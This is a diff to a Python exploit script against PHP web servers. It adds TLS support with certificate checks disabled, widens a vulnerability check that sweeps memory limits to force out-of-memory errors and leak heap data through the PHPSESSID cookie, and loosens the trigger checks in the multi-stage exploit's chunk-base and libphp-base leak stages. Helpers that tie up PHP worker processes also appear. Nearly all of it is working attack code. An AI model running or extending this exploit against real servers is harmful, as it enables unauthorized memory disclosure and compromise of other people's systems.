@@ -19,6 +19,7 @@ from __future__ import annotations
 import argparse
 import re
 import socket
+import ssl
 import struct
 import subprocess
 import sys
@@ -104,6 +105,19 @@ STAGE3_PADS_BOOKWORM = [(31, 31)] * 6
 STAGE3_PADS_LAB = [(8, 7)] + [(7, 7)] * 5
 HTDATA_CANDIDATES = [0x690D8, 0x6E0D8, 0x5404A]
 
+USE_SSL = False
+SSL_HOST = ""
+
+
+def _connect(host: str, port: int, timeout: float = 10.0) -> socket.socket:
+    s = socket.create_connection((host, port), timeout=timeout)
+    if USE_SSL:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        s = ctx.wrap_socket(s, server_hostname=SSL_HOST or host)
+    return s
+
 
 # ---------------------------------------------------------------------------
 # Multipart builder
@@ -140,10 +154,9 @@ def send_post(host: str, port: int, path: str, body: bytes, boundary: bytes,
         f"Connection: close\r\n"
         f"\r\n"
     ).encode()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(timeout)
     try:
-        sock.connect((host, port))
+        sock = _connect(host, port, timeout)
+        sock.settimeout(timeout)
         data = bytearray()
 
         def _reader():
@@ -178,11 +191,10 @@ def send_post(host: str, port: int, path: str, body: bytes, boundary: bytes,
 
 
 def send_raw(host: str, port: int, data: bytes, timeout: float = 10.0) -> bytes:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(timeout)
     out = bytearray()
     try:
-        s.connect((host, port))
+        s = _connect(host, port, timeout)
+        s.settimeout(timeout)
         s.sendall(data)
         while len(out) < 65536:
             chunk = s.recv(65536)
@@ -335,9 +347,8 @@ def probe_memory_limit(host: str, port: int, path: str) -> int | None:
         ).encode()
         resp = bytearray()
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = _connect(host, port, 60)
             s.settimeout(60)
-            s.connect((host, port))
             s.sendall(hdr)
             s.sendall(body)
             while len(resp) < 65536:
@@ -363,7 +374,7 @@ def hold_workers(host: str, port: int, path: str, count: int) -> list[socket.soc
     holders = []
     for i in range(count):
         try:
-            s = socket.create_connection((host, port), timeout=5)
+            s = _connect(host, port, 5)
             s.sendall(
                 f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -388,7 +399,7 @@ def auto_detect_workers(host: str, port: int, path: str,
     socks: list[socket.socket] = []
     for _ in range(max_probe):
         try:
-            s = socket.create_connection((host, port), timeout=3)
+            s = _connect(host, port, 3)
             s.sendall(
                 f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                 f"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -400,7 +411,7 @@ def auto_detect_workers(host: str, port: int, path: str,
         time.sleep(0.05)
         alive = False
         try:
-            probe = socket.create_connection((host, port), timeout=2)
+            probe = _connect(host, port, 2)
             probe.sendall(
                 f"GET {path} HTTP/1.0\r\nHost: {host}:{port}\r\n\r\n".encode())
             probe.settimeout(2)
@@ -843,38 +854,53 @@ def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
     elif not results["upload_progress"]:
         print("  Skipped -- upload_progress not available")
         results["disclosure"] = False
-    elif not detected_mb:
-        print("  Trying common memory limits (8, 16, 32, 64, 128)...")
-        disclosure = False
-        for try_mb in (8, 16, 32, 64, 128):
-            huge = try_mb + 12
-            resp_a = stage1_oom(host, port, path, huge)
-            if resp_a and b"Allowed memory size" in resp_a:
-                time.sleep(0.2)
-                cookie = stage1_leak(host, port, path, 900, 48)
-                if len(cookie) > 40:
-                    print(f"  VULNERABLE -- OOM at {try_mb}M leaked {len(cookie)}B cookie")
-                    disclosure = True
-                    break
-        if not disclosure:
-            print("  Could not trigger OOM disclosure")
-        results["disclosure"] = disclosure
     else:
-        huge = detected_mb + 12
-        resp_a = stage1_oom(host, port, path, huge)
-        if not resp_a or b"Allowed memory size" not in resp_a:
-            print("  OOM not triggered")
-            results["disclosure"] = False
+        if detected_mb:
+            limits_to_try = [detected_mb]
         else:
-            time.sleep(0.2)
+            limits_to_try = [8, 16, 32, 64, 128, 256, 512]
+            print("  memory_limit unknown, sweeping common values...")
+
+        disclosure = False
+        post_max_blocked = False
+        for try_mb in limits_to_try:
+            huge = try_mb + 12
+            print(f"  Trying memory_limit={try_mb}M (body={huge}M)...")
+            resp_a = stage1_oom(host, port, path, huge)
+
+            oom_visible = resp_a and b"Allowed memory size" in resp_a
+            got_response = resp_a and len(resp_a) > 0
+
+            if resp_a and (b"413" in resp_a[:50] or b"Request Entity Too Large" in resp_a):
+                print(f"    413 -- post_max_size < {huge}M")
+                post_max_blocked = True
+                continue
+
+            if not got_response:
+                print(f"    No response (connection dropped or timeout)")
+                continue
+
+            if oom_visible:
+                print(f"    OOM error visible in response")
+
+            time.sleep(0.3)
             cookie = stage1_leak(host, port, path, 900, 48)
             if len(cookie) > 40:
-                print(f"  VULNERABLE -- leaked {len(cookie)}B via PHPSESSID cookie")
-                results["disclosure"] = True
+                print(f"    VULNERABLE -- leaked {len(cookie)}B via PHPSESSID cookie")
+                disclosure = True
+                break
+            elif len(cookie) > 0:
+                print(f"    Cookie normal ({len(cookie)}B) -- OOM may not have fired")
             else:
-                print(f"  OOM triggered but cookie is normal ({len(cookie)}B)")
-                print("  May need different heap state (try restarting the target)")
-                results["disclosure"] = False
+                print(f"    No cookie returned")
+
+        if not disclosure and post_max_blocked:
+            print("  post_max_size is too small for OOM trigger")
+            print("  The vulnerability may exist but cannot be reached")
+        elif not disclosure:
+            print("  Could not trigger OOM disclosure at any tested limit")
+        results["disclosure"] = disclosure
+        results["post_max_blocked"] = post_max_blocked
 
     # Verdict
     print()
@@ -905,9 +931,15 @@ def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
             reasons.append("memory_limit unknown")
         if sapi == "fpm":
             reasons.append("FPM SAPI (workers crash on OOM)")
+        if results.get("post_max_blocked"):
+            reasons.append("post_max_size too small (blocks OOM trigger body)")
         if reasons:
             print(f"  Blockers: {'; '.join(reasons)}")
-        print("  Target may still be vulnerable but check could not confirm it.")
+        if results.get("post_max_blocked"):
+            print("  post_max_size must be >= memory_limit + 12M for OOM trigger.")
+            print("  Target may be vulnerable but unreachable with current config.")
+        else:
+            print("  Target may still be vulnerable but check could not confirm it.")
         return 2
 
 
@@ -948,10 +980,13 @@ def main() -> int:
                     help="docker command prefix")
     args = ap.parse_args()
 
+    global USE_SSL, SSL_HOST
     u = urllib.parse.urlsplit(args.target if "://" in args.target else "http://" + args.target)
     host = u.hostname or "127.0.0.1"
-    port = u.port or 80
+    USE_SSL = (u.scheme == "https")
+    port = u.port or (443 if USE_SSL else 80)
     path = u.path or "/index.php"
+    SSL_HOST = host
 
     if args.check:
         return check_vuln(host, port, path, args.memory_limit)
@@ -1143,8 +1178,8 @@ def run_exploit(host, port, path, huge_mb,
         print("  Stage 1: chunk base leak")
         rotate(host, port, path, huge_mb)
         resp = stage1_oom(host, port, path, huge_mb)
-        if not resp or b"Allowed memory size" not in resp:
-            print("    [!] OOM not triggered")
+        if not resp:
+            print("    [!] No response from OOM trigger")
             continue
         time.sleep(0.2)
         cookie = stage1_leak(host, port, path, stage1_n, forge_len)
@@ -1158,8 +1193,8 @@ def run_exploit(host, port, path, huge_mb,
         print("  Stage 2: libphp base leak")
         rotate(host, port, path, huge_mb)
         resp = stage2_oom(host, port, path, huge_mb)
-        if not resp or b"Allowed memory size" not in resp:
-            print("    [!] OOM not triggered")
+        if not resp:
+            print("    [!] No response from OOM trigger")
             continue
         time.sleep(0.2)
         cookie = stage2_leak(host, port, path, stage2_t, stage2_v)
